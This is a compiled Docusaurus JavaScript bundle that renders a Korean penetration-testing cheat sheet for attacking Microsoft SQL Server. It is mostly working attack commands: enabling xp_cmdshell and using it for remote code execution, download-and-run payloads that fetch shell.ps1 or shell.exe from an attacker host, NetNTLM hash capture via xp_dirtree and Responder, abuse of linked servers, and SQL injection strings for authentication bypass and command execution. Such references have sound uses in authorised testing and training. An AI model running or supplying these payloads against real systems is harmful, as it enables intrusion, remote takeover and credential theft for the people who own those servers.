"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[8311],{5500:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>r,contentTitle:()=>a,default:()=>o,frontMatter:()=>d,metadata:()=>l,toc:()=>t});const l=JSON.parse('{"id":"cheatsheet/database/mssql","title":"MSSQL - 1433 (Microsoft SQL Server)","description":"Microsoft SQL Server \uc5f0\uacb0 \ubc0f \uacf5\uaca9 \uae30\ubc95 \ubaa8\uc74c\uc785\ub2c8\ub2e4.","source":"@site/docs/cheatsheet/database/mssql.md","sourceDirName":"cheatsheet/database","slug":"/cheatsheet/database/mssql","permalink":"/my-docusaurus-page/cheatsheet/database/mssql","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"sidebar_position":3},"sidebar":"tutorialSidebar","previous":{"title":"MongoDB - 27017","permalink":"/my-docusaurus-page/cheatsheet/database/mongodb"},"next":{"title":"MySQL - 3306","permalink":"/my-docusaurus-page/cheatsheet/database/mysql"}}');var i=s(74848),c=s(28453);const d={sidebar_position:3},a="MSSQL - 1433 (Microsoft SQL Server)",r={},t=[{value:"\uc5f0\uacb0 \ubc29\ubc95",id:"\uc5f0\uacb0-\ubc29\ubc95",level:2},{value:"sqlcmd (Windows \ub124\uc774\ud2f0\ube0c)",id:"sqlcmd-windows-\ub124\uc774\ud2f0\ube0c",level:3},{value:"impacket-mssqlclient",id:"impacket-mssqlclient",level:3},{value:"Kerberos \ud2f0\ucf13 \uc0ac\uc6a9",id:"kerberos-\ud2f0\ucf13-\uc0ac\uc6a9",level:3},{value:"impacket-mssqlclient \uc720\uc6a9\ud55c \uba85\ub839\uc5b4",id:"impacket-mssqlclient-\uc720\uc6a9\ud55c-\uba85\ub839\uc5b4",level:2},{value:"\uae30\ubcf8 SQL \uba85\ub839\uc5b4",id:"\uae30\ubcf8-sql-\uba85\ub839\uc5b4",level:2},{value:"\ubc84\uc804 \ubc0f \uc815\ubcf4 \ud655\uc778",id:"\ubc84\uc804-\ubc0f-\uc815\ubcf4-\ud655\uc778",level:3},{value:"\ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc5f4\uac70",id:"\ub370\uc774\ud130\ubca0\uc774\uc2a4-\uc5f4\uac70",level:3},{value:"\ud14c\uc774\ube14 \uc5f4\uac70",id:"\ud14c\uc774\ube14-\uc5f4\uac70",level:3},{value:"\ub370\uc774\ud130 \uc870\ud68c",id:"\ub370\uc774\ud130-\uc870\ud68c",level:3},{value:"\uc0ac\uc6a9\uc790 \ubc0f \uad8c\ud55c \ud655\uc778",id:"\uc0ac\uc6a9\uc790-\ubc0f-\uad8c\ud55c-\ud655\uc778",level:3},{value:"Linked SQL Server",id:"linked-sql-server",level:2},{value:"\ub9c1\ud06c \uc11c\ubc84 \uc5f4\uac70",id:"\ub9c1\ud06c-\uc11c\ubc84-\uc5f4\uac70",level:3},{value:"\ub9c1\ud06c \uc11c\ubc84\ub97c \ud1b5\ud55c \uba85\ub839 \uc2e4\ud589",id:"\ub9c1\ud06c-\uc11c\ubc84\ub97c-\ud1b5\ud55c-\uba85\ub839-\uc2e4\ud589",level:3},{value:"OPENQUERY",id:"openquery",level:3},{value:"xp_cmdshell (RCE)",id:"xp_cmdshell-rce",level:2},{value:"\ud65c\uc131\ud654",id:"\ud65c\uc131\ud654",level:3},{value:"\ubc29\ubc95 1",id:"\ubc29\ubc95-1",level:4},{value:"\ubc29\ubc95 2",id:"\ubc29\ubc95-2",level:4},{value:"\ubc29\ubc95 3 (impacket)",id:"\ubc29\ubc95-3-impacket",level:4},{value:"\uba85\ub839 \uc2e4\ud589",id:"\uba85\ub839-\uc2e4\ud589",level:3},{value:"SQL Injection\uc744 \ud1b5\ud55c xp_cmdshell",id:"sql-injection\uc744-\ud1b5\ud55c-xp_cmdshell",level:3},{value:"\ud30c\uc77c \uc77d\uae30/\uc4f0\uae30",id:"\ud30c\uc77c-\uc77d\uae30\uc4f0\uae30",level:2},{value:"OPENROWSET\uc73c\ub85c \ud30c\uc77c \uc77d\uae30",id:"openrowset\uc73c\ub85c-\ud30c\uc77c-\uc77d\uae30",level:3},{value:"Binary \ucd94\ucd9c (Base64)",id:"binary-\ucd94\ucd9c-base64",level:3},{value:"NetNTLM Hash \ud0c8\ucde8",id:"netntlm-hash-\ud0c8\ucde8",level:2},{value:"xp_dirtree\ub97c \uc0ac\uc6a9\ud55c \ud574\uc2dc \ucea1\ucc98",id:"xp_dirtree\ub97c-\uc0ac\uc6a9\ud55c-\ud574\uc2dc-\ucea1\ucc98",level:3},{value:"SQL Injection \uc608\uc81c",id:"sql-injection-\uc608\uc81c",level:2},{value:"\uc778\uc99d \uc6b0\ud68c",id:"\uc778\uc99d-\uc6b0\ud68c",level:3},{value:"Time-Based Injection",id:"time-based-injection",level:3},{value:"UNION \uae30\ubc18 Injection",id:"union-\uae30\ubc18-injection",level:3},{value:"xp_cmdshell \ud65c\uc131\ud654 (Injection)",id:"xp_cmdshell-\ud65c\uc131\ud654-injection",level:3},{value:"RCE (Injection)",id:"rce-injection",level:3},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function h(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,c.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"mssql---1433-microsoft-sql-server",children:"MSSQL - 1433 (Microsoft SQL Server)"})}),"\n",(0,i.jsx)(n.p,{children:"Microsoft SQL Server \uc5f0\uacb0 \ubc0f \uacf5\uaca9 \uae30\ubc95 \ubaa8\uc74c\uc785\ub2c8\ub2e4."}),"\n",(0,i.jsx)(n.h2,{id:"\uc5f0\uacb0-\ubc29\ubc95",children:"\uc5f0\uacb0 \ubc29\ubc95"}),"\n",(0,i.jsx)(n.h3,{id:"sqlcmd-windows-\ub124\uc774\ud2f0\ube0c",children:"sqlcmd (Windows \ub124\uc774\ud2f0\ube0c)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'\nsqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>' -d <DATABASE>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"impacket-mssqlclient",children:"impacket-mssqlclient"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8 \uc5f0\uacb0\nimpacket-mssqlclient <USERNAME>@<RHOST>\nimpacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST>\n\n# Windows \uc778\uc99d\nimpacket-mssqlclient <USERNAME>@<RHOST> -windows-auth\nimpacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth\n\n# Kerberos \uc778\uc99d\nimpacket-mssqlclient -k -no-pass <RHOST>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"kerberos-\ud2f0\ucf13-\uc0ac\uc6a9",children:"Kerberos \ud2f0\ucf13 \uc0ac\uc6a9"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"export KRB5CCNAME=<USERNAME>.ccache\nimpacket-mssqlclient -k <RHOST>.<DOMAIN>\n"})}),"\n",(0,i.jsx)(n.h2,{id:"impacket-mssqlclient-\uc720\uc6a9\ud55c-\uba85\ub839\uc5b4",children:"impacket-mssqlclient \uc720\uc6a9\ud55c \uba85\ub839\uc5b4"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"SQL> enum_logins          # \ub85c\uadf8\uc778 \uacc4\uc815 \uc5f4\uac70\nSQL> enum_impersonate     # \uac00\uc7a5 \uac00\ub2a5\ud55c \uacc4\uc815 \uc5f4\uac70\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uae30\ubcf8-sql-\uba85\ub839\uc5b4",children:"\uae30\ubcf8 SQL \uba85\ub839\uc5b4"}),"\n",(0,i.jsx)(n.h3,{id:"\ubc84\uc804-\ubc0f-\uc815\ubcf4-\ud655\uc778",children:"\ubc84\uc804 \ubc0f \uc815\ubcf4 \ud655\uc778"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"SELECT @@version;\nSELECT SYSTEM_USER;\nSELECT USER_NAME();\nSELECT DB_NAME();\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\ub370\uc774\ud130\ubca0\uc774\uc2a4-\uc5f4\uac70",children:"\ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc5f4\uac70"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"SELECT name FROM sys.databases;\nSELECT name FROM master.sys.databases;\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\ud14c\uc774\ube14-\uc5f4\uac70",children:"\ud14c\uc774\ube14 \uc5f4\uac70"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM <DATABASE>.information_schema.tables;\nSELECT name FROM <DATABASE>.sys.tables;\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\ub370\uc774\ud130-\uc870\ud68c",children:"\ub370\uc774\ud130 \uc870\ud68c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM <DATABASE>.dbo.users;\nSELECT * FROM <DATABASE>.dbo.<TABLE>;\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\uc0ac\uc6a9\uc790-\ubc0f-\uad8c\ud55c-\ud655\uc778",children:"\uc0ac\uc6a9\uc790 \ubc0f \uad8c\ud55c \ud655\uc778"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"SELECT name,sysadmin FROM syslogins;\nSELECT SYSTEM_USER;\nSELECT IS_SRVROLEMEMBER('sysadmin');\n"})}),"\n",(0,i.jsx)(n.h2,{id:"linked-sql-server",children:"Linked SQL Server"}),"\n",(0,i.jsx)(n.h3,{id:"\ub9c1\ud06c-\uc11c\ubc84-\uc5f4\uac70",children:"\ub9c1\ud06c \uc11c\ubc84 \uc5f4\uac70"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"SELECT srvname,isremote FROM sysservers;\nEXEC sp_linkedservers;\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\ub9c1\ud06c-\uc11c\ubc84\ub97c-\ud1b5\ud55c-\uba85\ub839-\uc2e4\ud589",children:"\ub9c1\ud06c \uc11c\ubc84\ub97c \ud1b5\ud55c \uba85\ub839 \uc2e4\ud589"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"EXEC ('SELECT current_user') at [<DOMAIN>\\\\<CONFIG_FILE>];\nEXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\\\\<CONFIG_FILE>];\nEXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\\\\<CONFIG_FILE>]') at [<DOMAIN>\\\\<CONFIG_FILE>];\n"})}),"\n",(0,i.jsx)(n.h3,{id:"openquery",children:"OPENQUERY"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"select * from openquery(\"web\\\\clients\", 'select name from master.sys.databases');\nselect * from openquery(\"web\\\\clients\", 'select name from clients.sys.objects');\n"})}),"\n",(0,i.jsx)(n.h2,{id:"xp_cmdshell-rce",children:"xp_cmdshell (RCE)"}),"\n",(0,i.jsx)(n.h3,{id:"\ud65c\uc131\ud654",children:"\ud65c\uc131\ud654"}),"\n",(0,i.jsx)(n.h4,{id:"\ubc29\ubc95-1",children:"\ubc29\ubc95 1"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"EXEC sp_configure 'Show Advanced Options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n"})}),"\n",(0,i.jsx)(n.h4,{id:"\ubc29\ubc95-2",children:"\ubc29\ubc95 2"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"EXECUTE AS LOGIN = 'sa';\nEXEC sp_configure 'Show Advanced Options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n"})}),"\n",(0,i.jsx)(n.h4,{id:"\ubc29\ubc95-3-impacket",children:"\ubc29\ubc95 3 (impacket)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"enable_xp_cmdshell\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\uba85\ub839-\uc2e4\ud589",children:"\uba85\ub839 \uc2e4\ud589"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"EXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'dir';\nEXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://<LHOST>/shell.ps1'')\"';\nxp_cmdshell whoami\n"})}),"\n",(0,i.jsx)(n.h3,{id:"sql-injection\uc744-\ud1b5\ud55c-xp_cmdshell",children:"SQL Injection\uc744 \ud1b5\ud55c xp_cmdshell"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"'; EXEC master.dbo.xp_cmdshell 'ping <LHOST>'; --\n'; EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\\\Windows\\\\temp\\\\shell.exe'; --\n'; EXEC master.dbo.xp_cmdshell 'cmd /c C:\\\\Windows\\\\temp\\\\shell.exe'; --\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\ud30c\uc77c-\uc77d\uae30\uc4f0\uae30",children:"\ud30c\uc77c \uc77d\uae30/\uc4f0\uae30"}),"\n",(0,i.jsx)(n.h3,{id:"openrowset\uc73c\ub85c-\ud30c\uc77c-\uc77d\uae30",children:"OPENROWSET\uc73c\ub85c \ud30c\uc77c \uc77d\uae30"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM OPENROWSET(BULK 'C:\\\\PATH\\\\TO\\\\FILE\\\\file.txt', SINGLE_CLOB) AS x;\nSELECT * FROM OPENROWSET(BULK 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts', SINGLE_CLOB) AS x;\n"})}),"\n",(0,i.jsx)(n.h3,{id:"binary-\ucd94\ucd9c-base64",children:"Binary \ucd94\ucd9c (Base64)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"select cast((select content from openquery([web\\\\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;\ngo > export.txt\n"})}),"\n",(0,i.jsx)(n.h2,{id:"netntlm-hash-\ud0c8\ucde8",children:"NetNTLM Hash \ud0c8\ucde8"}),"\n",(0,i.jsx)(n.h3,{id:"xp_dirtree\ub97c-\uc0ac\uc6a9\ud55c-\ud574\uc2dc-\ucea1\ucc98",children:"xp_dirtree\ub97c \uc0ac\uc6a9\ud55c \ud574\uc2dc \ucea1\ucc98"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"EXEC master.dbo.xp_dirtree '\\\\<LHOST>\\\\share';\nEXEC master.dbo.xp_dirtree '\\\\<LHOST>\\\\FOOBAR';\n"})}),"\n",(0,i.jsx)(n.p,{children:"Responder\ub85c \ud574\uc2dc \ucea1\ucc98:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"sudo responder -I tun0\n"})}),"\n",(0,i.jsx)(n.h2,{id:"sql-injection-\uc608\uc81c",children:"SQL Injection \uc608\uc81c"}),"\n",(0,i.jsx)(n.h3,{id:"\uc778\uc99d-\uc6b0\ud68c",children:"\uc778\uc99d \uc6b0\ud68c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"' or 1=1--\nadmin' or 1=1--\n' or '1'='1'--\n"})}),"\n",(0,i.jsx)(n.h3,{id:"time-based-injection",children:"Time-Based Injection"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"' SELECT @@version; WAITFOR DELAY '00:00:10'; --\n"})}),"\n",(0,i.jsx)(n.h3,{id:"union-\uae30\ubc18-injection",children:"UNION \uae30\ubc18 Injection"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"' UNION SELECT null, @@version, null--\n' UNION SELECT 1, database(), user()--\n"})}),"\n",(0,i.jsx)(n.h3,{id:"xp_cmdshell-\ud65c\uc131\ud654-injection",children:"xp_cmdshell \ud65c\uc131\ud654 (Injection)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--\n"})}),"\n",(0,i.jsx)(n.h3,{id:"rce-injection",children:"RCE (Injection)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sql",children:"' exec xp_cmdshell \"powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\" ;--\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"MSSQL\uc740 \uae30\ubcf8\uc801\uc73c\ub85c 1433 \ud3ec\ud2b8 \uc0ac\uc6a9"}),"\n",(0,i.jsx)(n.li,{children:"xp_cmdshell\uc740 \ubcf4\uc548\uc0c1 \uae30\ubcf8\uc801\uc73c\ub85c \ube44\ud65c\uc131\ud654"}),"\n",(0,i.jsx)(n.li,{children:"sysadmin \uad8c\ud55c\uc774 \uc788\uc5b4\uc57c xp_cmdshell \ud65c\uc131\ud654 \uac00\ub2a5"}),"\n",(0,i.jsx)(n.li,{children:"Linked Server\ub97c \ud1b5\ud55c \uad8c\ud55c \uc0c1\uc2b9 \uac00\ub2a5"}),"\n",(0,i.jsx)(n.li,{children:"NetNTLM \ud574\uc2dc \ub9b4\ub808\uc774 \uacf5\uaca9\uc5d0 \ucde8\uc57d"}),"\n",(0,i.jsx)(n.li,{children:"Windows \uc778\uc99d \uc0ac\uc6a9 \uc2dc \ub3c4\uba54\uc778 \uc790\uaca9\uc99d\uba85 \ud544\uc694"}),"\n"]})]})}function o(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>d,x:()=>a});var l=s(96540);const i={},c=l.createContext(i);function d(e){const n=l.useContext(c);return l.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:d(e.components),l.createElement(c.Provider,{value:n},e.children)}}}]);